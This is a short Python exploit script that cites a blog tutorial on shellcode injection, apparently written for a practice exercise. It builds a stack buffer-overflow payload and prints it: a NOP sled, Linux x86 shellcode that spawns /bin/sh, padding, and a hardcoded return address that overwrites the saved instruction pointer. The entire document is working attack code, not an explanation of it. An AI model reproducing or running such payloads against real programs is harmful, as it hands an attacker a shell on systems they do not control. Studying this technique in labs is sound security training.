# https://dhavalkapil.com/blogs/Shellcode-Injection/

import struct
import sys

pad = b"\x41" * 47
# addr = struct.pack("<I", 0xffffc8e0)
addr = b"\xe0\xc8\xff\xff"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
NOP = b"\x90" * 40

payload = NOP + shellcode + pad + addr
# print(payload)
sys.stdout.buffer.write(payload)
